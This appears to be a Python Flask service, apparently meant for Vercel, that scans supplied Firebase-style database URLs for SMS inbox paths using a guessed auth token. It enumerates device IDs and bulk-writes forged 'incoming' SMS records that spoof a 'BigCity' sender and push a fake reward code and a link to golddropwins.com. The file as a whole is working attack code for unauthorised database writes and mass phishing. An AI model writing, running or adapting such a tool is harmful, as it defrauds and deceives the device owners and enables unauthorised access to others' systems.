import requests
import urllib3
import time
import uuid
import random
import string
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request, jsonify

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)

# --- CONFIGURATION ---
SENDER = "VK-BGCITY-S"
AUTH_TOKEN = "PASS" 
KNOWN_PATHS = ["messages", "sms", "clients", "inbox", "SMS", "receivedSms", "smsList"]

def generate_code():
    chars = string.ascii_uppercase + string.digits
    first_char = random.choice(['7', '8'])
    rest_of_code = ''.join(random.choices(chars, k=11))
    return first_char + rest_of_code

def get_device_list(base_url):
    if not base_url.endswith("/"):
        base_url += "/"
    for path in KNOWN_PATHS:
        try:
            r = requests.get(f"{base_url}{path}.json?shallow=true&auth={AUTH_TOKEN}", verify=False, timeout=10)
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, dict) and data:
                    return path, list(data.keys())
        except Exception:
            pass
    return None, []

def send_to_device(base_url, path, device_id):
    if not base_url.endswith("/"):
        base_url += "/"
    timestamp = int(time.time() * 1000)
    unique_id = uuid.uuid4().hex[:4]
    new_key = f"zz_{timestamp}_{unique_id}"
    url = f"{base_url}{path}/{device_id}/{new_key}.json?auth={AUTH_TOKEN}"
    date_str = datetime.now().strftime("%d-%m-%Y | %I:%M %p").lower()
    
    new_code = generate_code()
    message_body = f"Success! Your Reward Code is {new_code}. Please visit https://www.golddropwins.com/ to redeem your reward. Team BigCity"
    
    payload = {
        "sender": SENDER,
        "dateTime": date_str,
        "message": message_body,
        "id": timestamp,
        "type": "incoming"
    }

    try:
        response = requests.put(url, json=payload, verify=False, timeout=10)
        return response.status_code == 200
    except Exception:
        return False

@app.route('/', methods=['POST', 'GET'])
def blast():
    # This handles both POST requests (for the API) and GET requests (for easy browser testing)
    if request.method == 'GET':
        return jsonify({"status": "Online", "message": "Send a POST request with JSON to trigger the blast."})

    data = request.get_json()
    if not data:
        return jsonify({"error": "Missing JSON body"}), 400

    urls = data.get("urls", [])
    msgs_per_device = int(data.get("msgs_per_device", 1))

    if not urls:
        return jsonify({"error": "No URLs provided"}), 400

    all_tasks = []
    for url in urls:
        path, devices = get_device_list(url)
        if path and devices:
            for dev in devices:
                for _ in range(msgs_per_device):
                    all_tasks.append((url, path, dev))

    if not all_tasks:
        return jsonify({"error": "No devices found to send to."}), 404

    success_count = 0
    fail_count = 0

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(send_to_device, u, p, d) for (u, p, d) in all_tasks]
        for future in as_completed(futures):
            if future.result():
                success_count += 1
            else:
                fail_count += 1

    return jsonify({
        "status": "finished",
        "total_devices": len(all_tasks) // msgs_per_device,
        "total_messages": len(all_tasks),
        "successful": success_count,
        "failed": fail_count
    })

# Vercel automatically looks for a variable named 'app'
